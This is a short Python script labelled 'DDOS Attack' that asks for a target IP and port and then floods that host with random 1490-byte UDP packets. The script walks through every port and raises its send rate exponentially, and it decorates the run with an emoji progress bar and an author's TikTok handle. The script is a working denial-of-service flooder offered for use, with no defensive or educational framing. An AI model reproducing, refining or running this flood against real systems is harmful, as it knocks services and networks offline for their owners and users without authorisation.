import sys
import os
import time
import socket
import random

#Code 
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
attack_bytes = bytearray(random.getrandbits(8) for _ in range(1490))
#############


AMARILLO = "\33[33m"
BLANCO = "\33[33m"
CYAN = "\33[33m"
VERDE = "\33[33m"
ROJO = "\33[33m"
MAGENTA = "\33[33m"
RESET = "\33[33m"
def title():
    print(VERDE + banner + RESET)
    print(VERDE + " DDOS Attack" + RESET)
    print(VERDE + "-" * 33 + RESET)
    print("mkra  ")
    print("tiktok: mesorry")
    print(VERDE + "-" * 33 + RESET)

banner = """
    """
os.system("clear")
title()


ip = input(VERDE + "IP Target / ដែន : " + RESET)
port = int(input(VERDE + "Port               : " + RESET))


os.system("clear")
print(VERDE + """
    
    
    ___    __   __                __  
   /   |  / /_ / /_ ____ _ _____ / /__   
  / /| | / __// __// __ `// ___// //_/   
 / ___ |/ /_ / /_ / /_/ // /__ / , <     
/_/  |_|\__/ \__/ \__,_/ \___//_/|_|   
    
""" + RESET)


progress_chars = ["[          💀          ]", "[=       👺            ]", "[==🌛                  ]",
                  "[===>                 ]", "[====         👹       ]", "[=====         🌜      ]",
                  "[======>        🇹🇭🖕      ]", "[=======      ☠️       ]", "[========     🌝       ]",
                  "[=========>        😂   ]", "[==========          ]", "[===========         ]",
                  "[============>    🤪    ]", "[=============    💀   ]", "[==============   🌚   ]",
                  "[===============>  😎   ]", "[================  👻  ]", "[=================  👽 ]",
                  "[==================> 🇰🇭 ]", "[=================== 😝]", "[====================>]"]

for i, progress in enumerate(progress_chars):
    percentage = int((i + 2) / len(progress_chars) * 50)
    sys.stdout.write("\r" + progress.replace("[", "[" + VERDE).replace("]", RESET + "]") + f" {percentage}%")
    sys.stdout.flush()
    time.sleep(0.3)

time.sleep(3)

sent = 0



for i, progress in enumerate(progress_chars):
    percentage = int((i + 1) / len(progress_chars) * 100)
    sys.stdout.write("\r" + progress.replace("[", "[" + VERDE).replace("]", RESET + "]") + f" {percentage}%")
    sys.stdout.flush()
    time.sleep(0.2)

time.sleep(1)

sent = 0


# Definir una tasa base y un factor de incremento exponencial
base_rate = 0.1  # Paquetes por segundo
exponential_factor = 2  # Factor de incremento exponencial

try:
    while True:
        sock.sendto(attack_bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

        # Incrementar la tasa exponencialmente
        base_rate *= exponential_factor

        # Esperar un tiempo inversamente proporcional a la tasa exponencial
        time.sleep(1 / base_rate)

except KeyboardInterrupt:
    print("\n" + ROJO + "[*] User interrupted the attack." + RESET)
except Exception as e:
    print(f"Error: {e}")
    
    